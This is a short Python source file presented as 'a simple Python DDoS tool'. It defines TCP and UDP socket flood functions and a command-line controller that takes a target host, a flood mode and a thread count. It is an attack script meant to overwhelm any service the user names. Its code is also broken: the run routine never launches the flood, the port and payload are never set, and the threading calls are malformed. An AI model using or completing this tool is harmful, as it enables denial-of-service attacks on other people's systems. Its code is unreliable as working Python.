#
# Modules
#
import os, sys, time, subprocess
import socket
from threading import Thread
from colorama import Fore, Style
from argparse import ArgumentParser

class Dos():

    def tcp_flood(self, data, ip, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))
            sock.send(data)

    def udp_flood(self, data, ip, port):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(data, (ip, port))

class Controller(Dos):

    def __init__(self):
        # Time
        self.lt = time.localtime()
        self.time_hm = time.strftime("%H:%M")

        # Banner
        self.banner_txt = time.strftime("""
         __      __            ___    __                ___    ___               
        /\ \  __/\ \          /\_ \  /\ \              /\_ \  /\_ \              
        \ \ \/\ \ \ \     __  \//\ \ \ \ \___      __  \//\ \ \//\ \      __     
         \ \ \ \ \ \ \  /'__`\  \ \ \ \ \  _ `\  /'__`\  \ \ \  \ \ \   /'__`\   
          \ \ \_/ \_\ \/\ \L\.\_ \_\ \_\ \ \ \ \/\ \L\.\_ \_\ \_ \_\ \_/\ \L\.\_ 
           \ `\___x___/\ \__/.\_\/\____\\ \_\ \_\ \__/.\_\/\____\/\____\ \__/.\_\
            '\/__//__/  \/__/\/_/\/____/ \/_/\/_/\/__/\/_/\/____/\/____/\/__/\/_/
                               
                               » A SIMPLE PYTHON DDOS TOOL «
                    Coded by PiereLucas | https://github.com/pierelucas
                    Date: %d.%m.%y      | Time: %H:%M
                    
            """)

        # Details
        self.host = None
        self.ip = None
        self.port = None
        self.num_req = None

    def arguments(self):
        parser = ArgumentParser(description=self.banner_txt)
        parser.add_argument("-t", "--target", dest="target_addr")
        parser.add_argument("-m", "--mode", dest="dos_mode")
        parser.add_argument("-a", "--amount", dest="amount")
        args = parser.parse_args()
        _true = self.check_args(args)
        if _true:
            return args.target_addr, args.dos_mode, args.amount

    def check_args(self, args):
        if args.target_addr and args.dos_mode and args.amount:
            return True
        else:
            print("Use -h or --help for futher information")
            sys.exit(0)

    def get_fqdm(self, target_addr):
        target_ip = socket.gethostbyname(target_addr)
        return target_ip

    def out(self):
        print(Fore.CYAN + self.banner_txt)
        print(Style.RESET_ALL)

    def threads(self, amount, dos_mode, data, target_ip, port):
        if dos_mode == 'tcp':
            self.dos = self.tcp_flood(data, target_ip, port)
        elif dos_mode == 'udp':
            self.dos = self.udp_flood(data, target_ip, port)
        for thread in range(amount+1):
            thread = Thread(self.dos)
            print("Starting Thread [{}]".format(thread))
            try:
                if thread.start():
                    print("Sucessfully started [{}]".format(thread))
            except Exception:
                continue

    def run(self):
        target_addr, dos_mode, amount = self.arguments()
        target_ip = self.get_fqdm(target_addr)

if __name__ == "__main__":
    cc = Controller()
    cc.run()
